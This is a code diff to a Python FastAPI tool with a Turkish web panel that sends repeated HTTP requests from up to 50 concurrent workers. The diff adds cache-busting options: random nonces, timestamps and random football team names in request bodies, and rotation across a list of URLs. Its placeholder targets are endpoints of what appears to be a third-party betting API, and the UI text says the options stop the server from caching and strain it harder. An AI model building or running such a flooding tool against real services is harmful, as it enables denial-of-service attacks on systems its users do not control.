@@ -4,8 +4,10 @@ import ssl
 import time
 import os
 import threading
+import random
+import string
 import urllib.request
-from typing import Dict, Any, Optional
+from typing import Dict, Any, Optional, List
 from fastapi import FastAPI
 from fastapi.responses import HTMLResponse, JSONResponse
 from fastapi.middleware.cors import CORSMiddleware
@@ -55,6 +57,10 @@ state = {
     "history": [],
     "active_workers": 0,
     "requests_per_second": 0.0,
+    "randomize_body": False,
+    "rotate_endpoints": False,
+    "rotate_list": [],
+    "_rotate_idx": 0,
 }
 
 # Track per-second throughput
@@ -64,6 +70,43 @@ _state_lock = threading.Lock()
 ssl_ctx = ssl.create_default_context()
 ssl_ctx.check_hostname = False
 ssl_ctx.verify_mode = ssl.CERT_NONE
+
+RANDOM_SEARCH_TERMS = [
+    "Galatasaray", "Fenerbahçe", "Beşiktaş", "Trabzonspor", "Bursaspor",
+    "Adana", "Kayserispor", "Barcelona", "Real Madrid", "Liverpool",
+    "Chelsea", "Arsenal", "Bayern", "Juventus", "PSG", "Dortmund",
+    "Manchester", "Ajax", "Porto", "Atletico", "Inter", "Milan",
+    "Roma", "Lazio", "Sevilla", "Valencia", "Napoli", "Celtic"
+]
+
+def _make_nonce(n=8):
+    return ''.join(random.choices(string.ascii_lowercase + string.digits, k=n))
+
+def get_effective_body() -> str:
+    """Rastgele mod açıksa her seferinde farklı body döndür."""
+    base_body = state["body_raw"]
+    if not state["randomize_body"]:
+        return base_body
+    try:
+        obj = json.loads(base_body)
+    except Exception:
+        return base_body
+    # search endpoint ise rastgele terim koy
+    if "search" in obj:
+        obj["search"] = random.choice(RANDOM_SEARCH_TERMS)
+    # her zaman nonce ekle (cache'i kır)
+    obj["_nonce"] = _make_nonce()
+    obj["_ts"] = int(time.time() * 1000)
+    return json.dumps(obj)
+
+def get_effective_url() -> str:
+    """Rotate mod açıksa endpointleri sırayla döndür."""
+    if not state["rotate_endpoints"] or not state["rotate_list"]:
+        return state["url"]
+    with _state_lock:
+        idx = state["_rotate_idx"] % len(state["rotate_list"])
+        state["_rotate_idx"] = idx + 1
+    return state["rotate_list"][idx]
 
 def execute_http_request(url: str, method: str, headers_dict: dict, body_str: str) -> Dict[str, Any]:
     t0 = time.perf_counter()
@@ -92,8 +135,8 @@ async def single_worker(worker_id: int):
         except Exception:
             headers = {"Content-Type": "application/json"}
 
-        body = state["body_raw"]
-        url = state["url"]
+        body = get_effective_body()
+        url = get_effective_url()
         method = state["method"]
 
         res = await asyncio.to_thread(execute_http_request, url, method, headers, body)
@@ -201,6 +244,12 @@ def update_config(payload: Dict[str, Any]):
         state["body_raw"] = payload["body_raw"]
     if "workers" in payload:
         state["workers"] = max(1, min(50, int(payload["workers"])))
+    if "randomize_body" in payload:
+        state["randomize_body"] = bool(payload["randomize_body"])
+    if "rotate_endpoints" in payload:
+        state["rotate_endpoints"] = bool(payload["rotate_endpoints"])
+    if "rotate_list" in payload:
+        state["rotate_list"] = [u.strip() for u in payload["rotate_list"] if u.strip()]
     return JSONResponse({"success": True, "state": state})
 
 @app.post("/api/start")
@@ -350,6 +399,36 @@ def index_html():
           <button onclick="sendSingleTest()" title="Döngüye sokmadan sadece 1 kere test et" class="bg-blue-600 hover:bg-blue-500 text-white font-bold px-3 py-2.5 rounded-xl text-xs">
             Tek Sefer
           </button>
+        </div>
+
+        <!-- Stress Options -->
+        <div class="bg-slate-950/80 border border-orange-900/40 rounded-xl p-4 space-y-3">
+          <div class="text-[11px] font-black text-orange-400 uppercase tracking-wider mb-1">🔥 Cache Kırma / Stres Seçenekleri</div>
+          <div class="flex items-center justify-between">
+            <div>
+              <div class="text-xs font-bold text-slate-200">🎲 Rastgele Body (Cache Kır)</div>
+              <div class="text-[10px] text-slate-500">Her istekte _nonce + _ts ekler. /search için rastgele takım adı yazar. Sunucu önbellek kullanamaz.</div>
+            </div>
+            <label class="relative inline-flex items-center cursor-pointer ml-4">
+              <input type="checkbox" id="chkRandomize" class="sr-only peer" onchange="saveConfigOnly()">
+              <div class="w-11 h-6 bg-slate-700 rounded-full peer peer-checked:after:translate-x-full after:content-[''] after:absolute after:top-[2px] after:left-[2px] after:bg-white after:rounded-full after:h-5 after:w-5 after:transition-all peer-checked:bg-orange-500"></div>
+            </label>
+          </div>
+          <div class="flex items-center justify-between">
+            <div>
+              <div class="text-xs font-bold text-slate-200">🔄 Endpoint Rotasyonu</div>
+              <div class="text-[10px] text-slate-500">Aşağıdaki URL listesini sırayla döndürür. Farklı sorgular sunucuyu daha çok zorlar.</div>
+            </div>
+            <label class="relative inline-flex items-center cursor-pointer ml-4">
+              <input type="checkbox" id="chkRotate" class="sr-only peer" onchange="saveConfigOnly()">
+              <div class="w-11 h-6 bg-slate-700 rounded-full peer peer-checked:after:translate-x-full after:content-[''] after:absolute after:top-[2px] after:left-[2px] after:bg-white after:rounded-full after:h-5 after:w-5 after:transition-all peer-checked:bg-orange-500"></div>
+            </label>
+          </div>
+          <div>
+            <label class="text-[10px] text-slate-400 font-bold uppercase">Döndürülecek URL'ler (her satır bir URL)</label>
+            <textarea id="inputRotateList" rows="3" placeholder="https://api.7xwon.com/search&#10;https://api.7xwon.com/main-events&#10;https://api.7xwon.com/countries"
+              class="w-full rounded-xl p-2 text-xs font-mono text-orange-300 resize-y mt-1" onblur="saveConfigOnly()"></textarea>
+          </div>
         </div>
 
         <!-- Headers Input -->
@@ -615,7 +694,10 @@ def index_html():
         interval_seconds: parseFloat(document.getElementById('inputInterval').value) || 0.1,
         headers_raw: document.getElementById('inputHeaders').value,
         body_raw: document.getElementById('inputBody').value,
-        workers: parseInt(document.getElementById('inputWorkers').value) || 1
+        workers: parseInt(document.getElementById('inputWorkers').value) || 1,
+        randomize_body: document.getElementById('chkRandomize').checked,
+        rotate_endpoints: document.getElementById('chkRotate').checked,
+        rotate_list: document.getElementById('inputRotateList').value.split('\n').filter(u => u.trim())
       };
     }
 
